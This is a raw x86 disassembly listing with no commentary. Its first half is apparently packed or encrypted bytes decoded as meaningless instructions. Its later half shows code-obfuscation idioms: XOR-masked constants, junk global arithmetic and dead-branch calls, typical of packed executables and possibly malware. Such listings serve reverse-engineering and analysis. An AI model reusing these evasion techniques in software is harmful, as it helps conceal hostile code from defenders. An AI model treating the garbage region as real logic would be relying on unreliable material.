  41396f:	xor    al,0xb1
  413971:	sbb    al,0xe7
  413973:	les    edi,FWORD PTR [ebx+0x29ec3ba1]
  413979:	sbb    BYTE PTR [ecx],0x30
  41397c:	in     al,dx
  41397d:	push   edi
  41397e:	je     0x41392b
  413980:	dec    esi
  413981:	mov    BYTE PTR [eax-0x3e],dh
  413984:	or     cl,BYTE PTR [ebp-0x20]
  413987:	dec    ebp
  413988:	jl     0x413938
  41398a:	jb     0x413982
  41398c:	xor    DWORD PTR [edx+0x6373ef1b],ebp
  413992:	in     eax,dx
  413993:	jb     0x4139d6
  413995:	fsubr  st,st(5)
  413997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413998:	or     dh,BYTE PTR [ebx+edi*8-0x24]
  41399c:	adc    ecx,esp
  41399e:	cmp    BYTE PTR [eax-0x5b],ch
  4139a1:	jecxz  0x413931
  4139a3:	push   eax
  4139a4:	imul   edi,esp,0x52
  4139a7:	pusha  
  4139a8:	pop    ds
  4139a9:	mov    eax,0x65e0e447
  4139ae:	fld    TBYTE PTR [esi+edx*8]
  4139b1:	lea    ebx,[eax+ebx*1]
  4139b4:	push   cs
  4139b5:	mov    ecx,DWORD PTR [edi-0x3a880a38]
  4139bb:	sbb    al,0xe2
  4139bd:	jl     0x41398e
  4139bf:	or     BYTE PTR [eax],ch
  4139c1:	ret    
  4139c2:	cwde   
  4139c3:	push   edx
  4139c4:	adc    eax,0x83e6478
  4139c9:	icebp  
  4139ca:	push   ds
  4139cb:	push   cs
  4139cc:	mov    edi,DWORD PTR [esi+0x72]
  4139cf:	retf   
  4139d0:	imul   DWORD PTR [edi]
  4139d2:	xor    eax,0x48cf1c1c
  4139d7:	loopne 0x41399d
  4139d9:	(bad)  
  4139da:	lds    ebp,FWORD PTR [edi-0x54fd1688]
  4139e0:	dec    edi
  4139e1:	or     al,BYTE PTR [edi-0x42eb19c6]
  4139e7:	fstp   TBYTE PTR [edx]
  4139e9:	ja     0x4139fd
  4139eb:	(bad)  [edx-0x3497d60c]
  4139f1:	into   
  4139f2:	lods   eax,DWORD PTR ds:[esi]
  4139f3:	mov    bl,0x23
  4139f5:	push   ebp
  4139f6:	nop
  4139f7:	add    DWORD PTR [esi+0x652c664c],edi
  4139fd:	leave  
  4139fe:	out    0x4,eax
  413a00:	mov    dl,0xff
  413a02:	or     eax,0xfd9d6a95
  413a07:	sar    BYTE PTR [ebp+0x57],0x57
  413a0b:	mov    eax,0xbaea0189
  413a10:	scas   al,BYTE PTR es:[edi]
  413a11:	xchg   ebx,eax
  413a12:	int    0xc6
  413a14:	loope  0x4139c3
  413a16:	fst    DWORD PTR ds:0x2428f77
  413a1c:	in     eax,0xe3
  413a1e:	ror    esp,cl
  413a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a21:	add    DWORD PTR [edi+edx*2],esp
  413a24:	sti    
  413a25:	in     al,0x8e
  413a27:	dec    edi
  413a28:	sbb    eax,0x12a5bd54
  413a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2e:	and    dl,BYTE PTR [esi+0x18a34522]
  413a34:	lea    eax,[ebp+0x29]
  413a37:	jae    0x413a41
  413a39:	dec    ebx
  413a3a:	fild   WORD PTR [esi-0x22]
  413a3d:	mov    al,ds:0x10dba511
  413a42:	mul    BYTE PTR [edi-0x6a]
  413a45:	jne    0x413a13
  413a47:	push   edi
  413a48:	jle    0x4139e7
  413a4a:	inc    esi
  413a4b:	stc    
  413a4c:	or     DWORD PTR [eax+0x2],0x1e0ca5d6
  413a53:	sti    
  413a54:	cli    
  413a55:	jnp    0x413ac3
  413a57:	xor    BYTE PTR [esi+0x768f0fbe],ch
  413a5d:	jmp    0xf4d4333d
  413a62:	jbe    0x413ac2
  413a64:	jl     0x4139e9
  413a66:	push   ebp
  413a67:	push   ecx
  413a68:	jns    0x413ae0
  413a6a:	fdivr  DWORD PTR [ecx]
  413a6c:	mov    ebp,0x22182770
  413a71:	jmp    0xd7b5bb9a
  413a76:	fadd   QWORD PTR [ebx-0x469b0bfe]
  413a7c:	pop    ebp
  413a7d:	les    edi,FWORD PTR [ebp+0x68605ffb]
  413a83:	mov    esi,0x9dd2471d
  413a88:	xchg   ebp,eax
  413a89:	pop    ds
  413a8a:	(bad)  
  413a8b:	jbe    0x413a23
  413a8d:	call   FWORD PTR [ecx+0x2ed0d931]
  413a93:	retf   0x2370
  413a96:	jnp    0x413a38
  413a98:	mov    WORD PTR [edi-0x667d92f7],es
  413a9e:	jmp    0xb3fff899
  413aa3:	sub    DWORD PTR [esi+eax*8+0x44],esp
  413aa7:	or     eax,esp
  413aa9:	inc    ecx
  413aaa:	stos   BYTE PTR es:[edi],al
  413aab:	sbb    BYTE PTR [ebx+0x2e12497c],ah
  413ab1:	and    eax,0x4cc434af
  413ab6:	ds data16 sbb al,0x88
  413aba:	stos   DWORD PTR es:[edi],eax
  413abb:	test   al,0x8
  413abd:	xor    ch,dl
  413abf:	jno    0x413a90
  413ac1:	pusha  
  413ac2:	imul   ebx,DWORD PTR [esi-0x5f],0x4c
  413ac6:	push   esp
  413ac7:	add    BYTE PTR [esi-0x62],bl
  413aca:	add    eax,0x616974a7
  413acf:	(bad)  
  413ad0:	mov    gs,WORD PTR [edx-0x6986925a]
  413ad6:	sub    BYTE PTR [ecx],dh
  413ad8:	imul   ebp,ebp,0x6597a886
  413ade:	test   DWORD PTR [ebx-0x33cbfd97],edi
  413ae4:	mov    edi,0xfa134d4d
  413ae9:	jle    0x413af9
  413aeb:	inc    eax
  413aec:	cdq    
  413aed:	ficom  DWORD PTR [eax+0x1b09cfbe]
  413af3:	cld    
  413af4:	les    esp,FWORD PTR [edx]
  413af6:	aam    0xe7
  413af8:	fist   DWORD PTR [ebp-0x2c23fb3a]
  413afe:	mov    ah,0x36
  413b00:	pop    ebp
  413b01:	add    DWORD PTR [ecx+0x3c882258],esp
  413b07:	sti    
  413b08:	push   0xdadf09a5
  413b0d:	shl    BYTE PTR es:[edx+0x2e],1
  413b11:	sub    DWORD PTR [ebx],edx
  413b13:	mov    edx,0xf11483d6
  413b18:	mov    cl,0xda
  413b1a:	jae    0x413b2a
  413b1c:	adc    bh,BYTE PTR [eax+edi*8]
  413b1f:	pop    ebx
  413b20:	int3   
  413b21:	outs   dx,DWORD PTR ds:[esi]
  413b22:	out    dx,al
  413b23:	repnz inc ecx
  413b25:	xlat   BYTE PTR ds:[ebx]
  413b26:	push   0xffffffab
  413b28:	rol    BYTE PTR [eax],1
  413b2a:	mov    eax,0x46ca14cb
  413b2f:	mov    esp,0x8f82bf77
  413b34:	sar    ch,0x69
  413b37:	lock repnz dec esi
  413b3a:	addr16 sub ah,dl
  413b3d:	fist   WORD PTR [ebx]
  413b3f:	jle    0x413b9b
  413b41:	mov    dh,BYTE PTR [edi]
  413b43:	mov    al,0x42
  413b45:	pusha  
  413b46:	fidivr DWORD PTR [eax+eax*8+0x7d8729cf]
  413b4d:	pusha  
  413b4e:	mov    dl,0x69
  413b50:	pusha  
  413b51:	dec    ebx
  413b52:	pop    ecx
  413b53:	out    dx,al
  413b54:	(bad)  [edx+0x4]
  413b57:	ins    DWORD PTR es:[edi],dx
  413b58:	inc    edx
  413b59:	or     eax,0x6d7d9a9f
  413b5e:	mov    eax,0x9b37471c
  413b63:	add    esp,DWORD PTR [edi]
  413b65:	test   esi,eax
  413b67:	(bad)  
  413b68:	xlat   BYTE PTR ds:[ebx]
  413b69:	add    BYTE PTR gs:[ebx-0x7dac3c1f],0xd3
  413b71:	fimul  DWORD PTR [edx+0x30b4b99b]
  413b77:	fstp   QWORD PTR [edi-0x566996e7]
  413b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b7e:	sbb    DWORD PTR [ebx-0x69de3e07],ebp
  413b84:	fisttp DWORD PTR [eax]
  413b86:	adc    al,0x7e
  413b88:	xor    cl,dl
  413b8a:	mov    dl,0xc3
  413b8c:	xchg   edx,eax
  413b8d:	(bad)  
  413b8f:	or     esp,DWORD PTR [ebp-0x5c]
  413b92:	add    al,0x43
  413b94:	mov    dl,0x43
  413b96:	mul    ebp
  413b98:	push   es
  413b99:	stos   DWORD PTR es:[edi],eax
  413b9a:	fscale 
  413b9c:	and    eax,0x25cbb84f
  413ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ba2:	mov    ch,0xcd
  413ba4:	test   edx,esi
  413ba6:	outs   dx,DWORD PTR ds:[esi]
  413ba7:	loop   0x413c24
  413ba9:	stos   DWORD PTR es:[edi],eax
  413baa:	jae    0x413b72
  413bac:	push   esp
  413bad:	xchg   bh,ah
  413baf:	push   0x20
  413bb1:	xlat   BYTE PTR ds:[ebx]
  413bb2:	jmp    0x413c32
  413bb4:	in     al,dx
  413bb5:	xchg   ecx,eax
  413bb6:	fisttp QWORD PTR [edx-0x31ab9bc1]
  413bbc:	dec    edx
  413bbd:	out    0x14,eax
  413bbf:	jecxz  0x413b46
  413bc1:	cmp    esi,DWORD PTR [ecx-0x59]
  413bc4:	in     al,0xf4
  413bc6:	int    0x26
  413bc8:	sbb    ch,ah
  413bca:	add    eax,0xad526527
  413bcf:	int    0x59
  413bd1:	cs jp  0x413bf2
  413bd4:	jle    0x413bcb
  413bd6:	lds    ebp,FWORD PTR [ebx+0x312e6f21]
  413bdc:	fisub  WORD PTR [esi+0x5c26e4bf]
  413be2:	sub    al,0x15
  413be4:	outs   dx,DWORD PTR ds:[esi]
  413be5:	add    eax,0x1995eef1
  413bea:	dec    eax
  413beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bec:	mov    ds:0x6ce611b5,al
  413bf1:	pushf  
  413bf2:	jmp    0x3860017a
  413bf7:	pop    esi
  413bf8:	(bad)  
  413bf9:	shl    DWORD PTR ds:0xa51d7d32,cl
  413bff:	and    BYTE PTR [edi],ah
  413c01:	sbb    eax,0x99d9eb7e
  413c06:	jle    0x413c58
  413c08:	adc    esi,DWORD PTR [esi]
  413c0a:	adc    esi,DWORD PTR [esi]
  413c0c:	dec    ebx
  413c0d:	sbb    esp,ebp
  413c0f:	jne    0x413c37
  413c11:	loop   0x413c7b
  413c13:	divps  xmm2,xmm7
  413c16:	and    DWORD PTR [edx-0x3844c97b],esp
  413c1c:	call   0x877f:0xac4d9163
  413c23:	sbb    cl,BYTE PTR [ebp-0x1f201100]
  413c29:	int3   
  413c2a:	push   eax
  413c2b:	push   ecx
  413c2c:	mov    ch,0x35
  413c2e:	xor    al,cl
  413c30:	test   DWORD PTR [eax+ebp*1-0x10],edi
  413c34:	push   eax
  413c35:	lahf   
  413c36:	aad    0x1a
  413c38:	xchg   esi,eax
  413c39:	cmp    eax,0x6ceec7c9
  413c3e:	(bad)  
  413c3f:	out    dx,eax
  413c40:	fwait
  413c41:	pop    esi
  413c42:	inc    esp
  413c43:	ror    BYTE PTR ds:0xf43e60dd,1
  413c49:	nop
  413c4a:	pop    esp
  413c4b:	in     eax,dx
  413c4c:	sbb    eax,0xc9ec4e94
  413c51:	mov    ebx,0x2213fc15
  413c56:	cmc    
  413c57:	pop    ss
  413c58:	mov    al,0xdc
  413c5a:	adc    esi,ecx
  413c5c:	stc    
  413c5d:	aad    0xd8
  413c5f:	into   
  413c60:	in     ax,0x43
  413c63:	ds xchg ebp,eax
  413c65:	hlt    
  413c66:	pop    ds
  413c67:	repz cmp ecx,eax
  413c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c6b:	dec    edx
  413c6c:	inc    edx
  413c6d:	or     edx,DWORD PTR [esi+eax*2-0x4f]
  413c71:	jb     0x413c28
  413c73:	jecxz  0x413c02
  413c75:	fucomp st(5)
  413c77:	jmp    0x4ea66cd5
  413c7c:	inc    esi
  413c7d:	push   ecx
  413c7e:	call   0xbe5df14e
  413c83:	mov    eax,ds:0xdee52298
  413c88:	loop   0x413cb4
  413c8a:	dec    ecx
  413c8b:	hlt    
  413c8c:	(bad)  
  413c8d:	cmp    ebx,esi
  413c8f:	xor    eax,0x68a04ed
  413c94:	adc    ebx,ecx
  413c96:	jae    0x413cc2
  413c98:	sti    
  413c99:	aam    0xa2
  413c9b:	mov    edi,0x1be0158e
  413ca0:	int3   
  413ca1:	cli    
  413ca2:	xor    eax,0x23b144b9
  413ca7:	jmp    0xce6e:0xffc9ec7d
  413cae:	xor    DWORD PTR [ebx-0x7f],eax
  413cb1:	inc    esp
  413cb2:	jg     0x413cfd
  413cb4:	outs   dx,DWORD PTR ds:[esi]
  413cb5:	repnz sub cl,BYTE PTR [ebx-0x36baf2fa]
  413cbc:	add    al,0xa4
  413cbe:	jbe    0x413d24
  413cc0:	fst    QWORD PTR [ecx+0x55c1374]
  413cc6:	ret    
  413cc7:	xchg   ebp,eax
  413cc8:	push   ebp
  413cc9:	in     eax,0xef
  413ccb:	lea    esp,[eax-0x8]
  413cce:	fnsave [eax+0x486ba9d0]
  413cd4:	inc    ecx
  413cd5:	pop    esi
  413cd6:	add    dl,ch
  413cd8:	test   eax,0xa6219def
  413cdd:	xor    DWORD PTR [eax+edx*2-0x2c0ce7fc],ebx
  413ce4:	adc    BYTE PTR [ebx],bl
  413ce6:	mov    ch,0xec
  413ce8:	sub    al,0x93
  413cea:	add    DWORD PTR [edi],edx
  413cec:	or     bh,BYTE PTR [bx+si+0x2adb]
  413cf1:	popa   
  413cf2:	sti    
  413cf3:	ret    
  413cf4:	or     eax,0x839a97cd
  413cf9:	push   0x78b276ea
  413cfe:	mov    ecx,DWORD PTR [ebp-0x14]
  413d01:	mov    eax,DWORD PTR [ecx+eax*4]
  413d04:	mov    DWORD PTR [ebp-0x38],eax
  413d07:	jmp    0x40f5ba
  413d0c:	mov    eax,DWORD PTR [ebp-0xc]
  413d0f:	xor    eax,esi
  413d11:	lea    ebx,[ebx+eax*1+0x3272f1]
  413d18:	jmp    0x40ac84
  413d1d:	mov    eax,DWORD PTR [ebp-0x4]
  413d20:	xor    eax,esi
  413d22:	add    eax,edi
  413d24:	jmp    0x413e48
  413d29:	mov    eax,DWORD PTR [ebp-0x38]
  413d2c:	add    eax,DWORD PTR [ebp+0x8]
  413d2f:	mov    DWORD PTR [ebp-0x18],eax
  413d32:	mov    eax,DWORD PTR [ebp-0x1c]
  413d35:	test   eax,eax
  413d37:	je     0x413dd1
  413d3d:	mov    DWORD PTR [ebp-0x20],0x0
  413d44:	push   0x3
  413d46:	xor    edx,edx
  413d48:	pop    edx
  413d49:	add    edx,0x8
  413d4c:	push   edx
  413d4d:	pop    ecx
  413d4e:	push   0x6
  413d50:	dec    ecx
  413d51:	pop    ebx
  413d52:	dec    ebx
  413d53:	xchg   ebx,ecx
  413d55:	sub    ebx,ecx
  413d57:	xchg   ebx,ecx
  413d59:	dec    ecx
  413d5a:	mov    eax,DWORD PTR [ebp-0x1c]
  413d5d:	imul   eax,ecx
  413d60:	sub    esp,eax
  413d62:	mov    DWORD PTR [ebp-0x20],esp
  413d65:	mov    eax,DWORD PTR [ebp-0x4]
  413d68:	xor    eax,esi
  413d6a:	add    eax,edi
  413d6c:	jmp    0x413daa
  413d71:	mov    ecx,DWORD PTR [ebp-0xc]
  413d74:	mov    eax,DWORD PTR [ebp+0x8]
  413d77:	mov    edx,DWORD PTR [ebp+0x14]
  413d7a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  413d7e:	xor    ecx,esi
  413d80:	add    ecx,edi
  413d82:	xor    edx,edx
  413d84:	div    ecx
  413d86:	mov    ecx,DWORD PTR [ebp-0x4]
  413d89:	xor    ecx,esi
  413d8b:	lea    eax,[ecx+eax*1+0x3272f1]
  413d92:	mov    ecx,DWORD PTR [ebp+0x8]
  413d95:	mov    edx,DWORD PTR [ebp-0x20]
  413d98:	mov    DWORD PTR [edx+ecx*4],eax
  413d9b:	mov    eax,DWORD PTR [ebp-0xc]
  413d9e:	mov    ecx,DWORD PTR [ebp+0x8]
  413da1:	xor    eax,esi
  413da3:	lea    eax,[eax+ecx*1+0x3272f1]
  413daa:	mov    DWORD PTR [ebp+0x8],eax
  413dad:	mov    eax,DWORD PTR [ebp-0xc]
  413db0:	mov    ecx,DWORD PTR [ebp+0x14]
  413db3:	xor    eax,esi
  413db5:	add    eax,edi
  413db7:	imul   eax,DWORD PTR [ecx]
  413dba:	mov    ecx,DWORD PTR [ebp-0x4]
  413dbd:	mov    edx,DWORD PTR [ebp+0x8]
  413dc0:	xor    ecx,esi
  413dc2:	lea    ecx,[ecx+edx*1+0x3272f1]
  413dc9:	cmp    ecx,eax
  413dcb:	jne    0x413d71
  413dd1:	mov    eax,DWORD PTR [ebp-0x4]
  413dd4:	xor    eax,esi
  413dd6:	add    eax,edi
  413dd8:	mov    DWORD PTR [ebp-0x10],eax
  413ddb:	mov    ebx,0x65655
  413de0:	add    ebx,0x3234
  413de6:	xchg   ebx,esi
  413de8:	xor    ebx,ebx
  413dea:	push   esi
  413deb:	mov    esi,ebx
  413ded:	pop    ebx
  413dee:	mov    edx,esi
  413df0:	add    ebx,0x1002
  413df6:	lea    eax,[ebp-0x18]
  413df9:	add    edx,eax
  413dfb:	add    edx,0x5
  413dfe:	push   edx
  413dff:	inc    esi
  413e00:	pop    ecx
  413e01:	dec    ecx
  413e02:	xchg   ecx,eax
  413e03:	dec    eax
  413e04:	xchg   ecx,eax
  413e05:	dec    ecx
  413e06:	xchg   ecx,edx
  413e08:	dec    edx
  413e09:	push   edx
  413e0a:	mov    edx,ebx
  413e0c:	pop    ebx
  413e0d:	dec    ebx
  413e0e:	call   DWORD PTR [ebx]
  413e10:	cmp    DWORD PTR [ebp+0x10],esi
  413e13:	je     0x413e34
  413e19:	xchg   edx,eax
  413e1a:	push   0xc
  413e1c:	pop    ecx
  413e1d:	dec    ecx
  413e1e:	push   0x3
  413e20:	pop    ebx
  413e21:	inc    ebx
  413e22:	xchg   ebx,ecx
  413e24:	inc    ecx
  413e25:	sub    ebx,ecx
  413e27:	xchg   ebx,ecx
  413e29:	dec    ecx
  413e2a:	dec    ecx
  413e2b:	mov    eax,DWORD PTR [ebp-0x1c]
  413e2e:	imul   eax,ecx
  413e31:	add    esp,eax
  413e33:	xchg   edx,eax
  413e34:	push   eax
  413e35:	xor    ebx,ebx
  413e37:	mov    edx,esp
  413e39:	dec    edx
  413e3a:	inc    ebx
  413e3b:	add    ebx,DWORD PTR [edx+ebx*1]
  413e3e:	dec    ebx
  413e3f:	xor    edx,edx
  413e41:	add    DWORD PTR [ebp-0x10],ebx
  413e44:	pop    ebx
  413e45:	mov    eax,DWORD PTR [ebp-0x10]
  413e48:	pop    edi
  413e49:	pop    esi
  413e4a:	pop    ebx
  413e4b:	leave  
  413e4c:	ret    0x10
  413e4f:	push   ebp
  413e50:	mov    ebp,esp
  413e52:	push   ecx
  413e53:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413e5a:	sub    ecx,edx
  413e5c:	mov    eax,DWORD PTR [ebp-0x4]
  413e5f:	mov    edx,DWORD PTR [ebp+0x10]
  413e62:	adc    DWORD PTR ds:0x42a2aa,ecx
  413e68:	mov    ecx,0x75108aa
  413e6d:	xor    eax,ecx
  413e6f:	sub    DWORD PTR ds:0x42a2d2,0x42a2ee
  413e79:	add    eax,0x3272f1
  413e7e:	mov    DWORD PTR [edx],eax
  413e80:	movzx  eax,BYTE PTR ds:0x42a2b6
  413e87:	sub    eax,DWORD PTR ds:0x42a2b2
  413e8d:	mov    ds:0x42a2b6,eax
  413e92:	mov    eax,DWORD PTR [ebp+0xc]
  413e95:	xor    eax,ecx
  413e97:	push   esi
  413e98:	mov    esi,DWORD PTR [ebp+0x10]
  413e9b:	and    DWORD PTR ds:0x42a2ae,0x0
  413ea5:	jmp    0x413eb7
  413eaa:	mov    edx,DWORD PTR ds:0x42a2ae
  413eb0:	inc    edx
  413eb1:	mov    DWORD PTR ds:0x42a2ae,edx
  413eb7:	cmp    DWORD PTR ds:0x42a2ae,0x15
  413ebe:	jae    0x413eee
  413ec4:	cmp    DWORD PTR ds:0x42a2ae,0x1b
  413ecb:	jl     0x413eee
  413ed1:	jmp    0x413ee9
  413ed6:	push   0x4a7a
  413edb:	push   0x52a4
  413ee0:	push   DWORD PTR [ebp-0x20]
  413ee3:	call   DWORD PTR ds:0x42a412
  413ee9:	jmp    0x413eaa
  413eee:	mov    edx,0x3272f1
  413ef3:	add    eax,edx
  413ef5:	mov    DWORD PTR [esi+0x4],eax
  413ef8:	mov    eax,DWORD PTR [ebp+0x14]
  413efb:	mov    esi,DWORD PTR [ebp+0x10]
  413efe:	mov    DWORD PTR [esi+0x8],eax
  413f01:	mov    eax,DWORD PTR [ebp+0x18]
  413f04:	mov    esi,DWORD PTR [ebp+0x10]
  413f07:	mov    DWORD PTR [esi+0xc],eax
  413f0a:	mov    eax,DWORD PTR [ebp+0x1c]
  413f0d:	mov    esi,DWORD PTR [ebp+0x10]
  413f10:	mov    DWORD PTR [esi+0x10],eax
  413f13:	mov    eax,DWORD PTR [ebp+0x8]
  413f16:	xor    eax,ecx
  413f18:	add    eax,edx
  413f1a:	pop    esi
  413f1b:	leave  
  413f1c:	ret    0x18
  413f1f:	push   ebp
  413f20:	mov    ebp,esp
  413f22:	sub    esp,0x9c
  413f28:	mov    ecx,DWORD PTR [ebp+0x8]
  413f2b:	add    DWORD PTR ds:0x42a2be,ecx
  413f31:	mov    eax,0x8a98
  413f36:	adc    DWORD PTR ds:0x42a2de,0x457a
  413f40:	xor    ax,WORD PTR [ecx+0x20]
  413f44:	mov    ecx,0x3b5a
  413f49:	adc    DWORD PTR ds:0x42a296,0x42a262
  413f53:	add    ax,cx
  413f56:	movzx  eax,ax
  413f59:	sub    ecx,DWORD PTR ds:0x42a276
  413f5f:	mov    DWORD PTR [ebp-0x10],eax
  413f62:	mov    BYTE PTR [ebp-0x1],0x7c
  413f66:	sbb    ecx,DWORD PTR ds:0x42a28e
  413f6c:	lea    eax,[ebp-0x1]
  413f6f:	mov    DWORD PTR [ebp-0xc],eax
  413f72:	mov    al,BYTE PTR [ebp-0x1]
  413f75:	sbb    DWORD PTR ds:0x42a276,0x42a2a6
  413f7f:	mov    ecx,DWORD PTR [ebp-0xc]
  413f82:	xor    al,0x7c
  413f84:	xor    DWORD PTR ds:0x42a27e,0x42a2d2
  413f8e:	inc    al
  413f90:	and    DWORD PTR ds:0x42a262,0x42a2fa
  413f9a:	mov    BYTE PTR [ecx],al
  413f9c:	add    eax,ecx
  413f9e:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  413fa5:	add    DWORD PTR ds:0x42a272,0x42a28e
  413faf:	push   ebx
  413fb0:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  413fb7:	mov    ecx,DWORD PTR [ebp-0x18]
  413fba:	push   esi
  413fbb:	mov    esi,DWORD PTR ds:0x42a346
  413fc1:	mov    eax,ds:0x42a372
  413fc6:	sub    eax,esi
  413fc8:	or     esi,DWORD PTR [esi+eax*1]
  413fcb:	mov    eax,0x75108aa
  413fd0:	sub    esi,DWORD PTR ds:0x42a2a6
  413fd6:	xor    ecx,eax
  413fd8:	mov    esi,0x3272f1
  413fdd:	push   edi
  413fde:	sbb    DWORD PTR ds:0x42a2fa,0x42a2f6
  413fe8:	add    ecx,esi
  413fea:	mov    DWORD PTR ds:0x42a2ee,0x6562
  413ff4:	jmp    0x414004
  413ff9:	mov    dl,BYTE PTR [ebp-0x1]
  413ffc:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  414003:	inc    ecx
  414004:	mov    DWORD PTR ds:0x42a2de,0x1651
  41400e:	cmp    ecx,0x40
  414011:	jb     0x413ff9
  414017:	mov    DWORD PTR ds:0x42a2ce,0x1c
  414021:	cmp    DWORD PTR ds:0x42a2ce,0x0
  414028:	je     0x414081
  41402e:	cmp    DWORD PTR ds:0x42a2ce,0x5
  414035:	jbe    0x414081
  41403b:	jmp    0x414055
  414040:	push   0x5b36
  414045:	push   0x4291e3
  41404a:	push   0x429247
  41404f:	call   DWORD PTR ds:0x42a3b6
  414055:	cmp    DWORD PTR ds:0x42a2ce,0x6
  41405c:	jne    0x41406f
  414062:	mov    edx,DWORD PTR ds:0x42a2ce
  414068:	dec    edx
  414069:	mov    DWORD PTR ds:0x42a2ce,edx
  41406f:	mov    edx,DWORD PTR ds:0x42a2ce
  414075:	dec    edx
  414076:	mov    DWORD PTR ds:0x42a2ce,edx
  41407c:	jmp    0x414021
  414081:	mov    edx,DWORD PTR [ebp-0x18]
  414084:	and    DWORD PTR ds:0x42a272,0x42a2aa
  41408e:	xor    edx,eax
  414090:	add    DWORD PTR ds:0x42a2d6,0x7605
  41409a:	add    edx,esi
  41409c:	mov    DWORD PTR ds:0x42a2c2,0x2718
  4140a6:	jmp    0x414179
  4140ab:	mov    edi,DWORD PTR [ebp+0x8]
  4140ae:	add    DWORD PTR ds:0x42a2a2,0x1c2b
  4140b8:	mov    ecx,0x8a98
  4140bd:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4140c2:	and    DWORD PTR ds:0x42a26e,0x0
  4140cc:	jmp    0x4140de
  4140d1:	mov    edi,DWORD PTR ds:0x42a26e
  4140d7:	inc    edi
  4140d8:	mov    DWORD PTR ds:0x42a26e,edi
  4140de:	cmp    DWORD PTR ds:0x42a26e,0x1f
  4140e5:	jae    0x414112
  4140eb:	cmp    DWORD PTR ds:0x42a26e,0x20
  4140f2:	jbe    0x414112
  4140f8:	jmp    0x41410d
  4140fd:	push   0x42a2d6
  414102:	push   0x4291fd
  414107:	call   DWORD PTR ds:0x42a3f2
  41410d:	jmp    0x4140d1
  414112:	mov    edi,0x3b5a
  414117:	sbb    DWORD PTR ds:0x42a2f6,0x4902
  414121:	add    cx,di
  414124:	add    DWORD PTR ds:0x42a2ae,0x42a296
  41412e:	movzx  ecx,cx
  414131:	xor    DWORD PTR ds:0x42a29e,0x6377
  41413b:	mov    DWORD PTR [ebp-0xc],ecx
  41413e:	sbb    ecx,DWORD PTR ds:0x42a2f6
  414144:	mov    ecx,DWORD PTR [ebp+0x8]
  414147:	movzx  ecx,WORD PTR [ecx+edx*4]
  41414b:	or     DWORD PTR ds:0x42a2ca,0x42a276
  414155:	xor    ecx,0x8a98
  41415b:	add    ecx,edi
  41415d:	movzx  edi,WORD PTR ds:0x42a2ea
  414164:	mov    edi,DWORD PTR [ebp-0xc]
  414167:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41416e:	mov    DWORD PTR ds:0x42a2c6,0x2666
  414178:	inc    edx
  414179:	mov    DWORD PTR ds:0x42a2d6,edi
  41417f:	mov    ecx,DWORD PTR [ebp-0x10]
  414182:	mov    DWORD PTR ds:0x42a2be,0x12d3
  41418c:	cmp    edx,ecx
  41418e:	mov    DWORD PTR ds:0x42a2de,0x4c7d
  414198:	jne    0x4140ab
  41419e:	or     edx,ecx
  4141a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4141a3:	and    DWORD PTR ds:0x42a2e6,0x0
  4141ad:	xor    edi,edi
  4141af:	add    edi,DWORD PTR ds:0x42a2e6
  4141b5:	inc    edi
  4141b6:	mov    DWORD PTR ds:0x42a2e6,edi
  4141bc:	cmp    DWORD PTR ds:0x42a2e6,0x2b
  4141c3:	jl     0x4141eb
  4141c9:	jmp    0x4141de
  4141ce:	push   0x42919f
  4141d3:	push   0x400000
  4141d8:	call   DWORD PTR ds:0x42a3ba
  4141de:	cmp    DWORD PTR ds:0x42a2e6,0x1b
  4141e5:	jb     0x4141ad
  4141eb:	mov    edx,DWORD PTR [ebp+0x10]
  4141ee:	mov    edi,DWORD PTR ds:0x42a27e
  4141f4:	sub    DWORD PTR ds:0x42a2f6,edi
  4141fa:	xor    ecx,eax
  4141fc:	and    edi,0x65ef
  414202:	add    ecx,esi
  414204:	adc    DWORD PTR ds:0x42a25e,0x5774
  41420e:	mov    DWORD PTR [edx],ecx
  414210:	mov    ecx,DWORD PTR [ebp-0x18]
  414213:	xor    ecx,eax
  414215:	add    ecx,esi
  414217:	mov    DWORD PTR ds:0x42a262,0x13
  414221:	cmp    DWORD PTR ds:0x42a262,0x0
  414228:	je     0x41426c
  41422e:	cmp    DWORD PTR ds:0x42a262,0x19
  414235:	jle    0x41426c
  41423b:	jmp    0x414258
  414240:	push   0x34ab
  414245:	push   0x42a2d2
  41424a:	push   DWORD PTR [ebp-0x14]
  41424d:	push   0x8eb1
  414252:	call   DWORD PTR ds:0x42a3f6
  414258:	xor    edi,edi
  41425a:	xor    edi,DWORD PTR ds:0x42a262
  414260:	dec    edi
  414261:	mov    DWORD PTR ds:0x42a262,edi
  414267:	jmp    0x414221
  41426c:	mov    DWORD PTR [ebp-0xc],ecx
  41426f:	mov    DWORD PTR ds:0x42a25a,0x1f
  414279:	cmp    DWORD PTR ds:0x42a25a,0x0
  414280:	je     0x4142c0
  414286:	cmp    DWORD PTR ds:0x42a25a,0x28
  41428d:	ja     0x4142c0
  414293:	jmp    0x4142ae
  414298:	push   0x2e6d
  41429d:	push   DWORD PTR [ebp-0x1c]
  4142a0:	push   DWORD PTR [ebp-0x28]
  4142a3:	push   0x29af
  4142a8:	call   DWORD PTR ds:0x42a3be
  4142ae:	mov    edi,DWORD PTR ds:0x42a25a
  4142b4:	dec    edi
  4142b5:	mov    DWORD PTR ds:0x42a25a,edi
  4142bb:	jmp    0x414279
  4142c0:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4142c7:	neg    edi
  4142c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4142d0:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4142d7:	mov    ecx,DWORD PTR [ebp-0x14]
  4142da:	mov    DWORD PTR [ebp+0x8],ecx
  4142dd:	adc    DWORD PTR ds:0x42a28e,0xc59
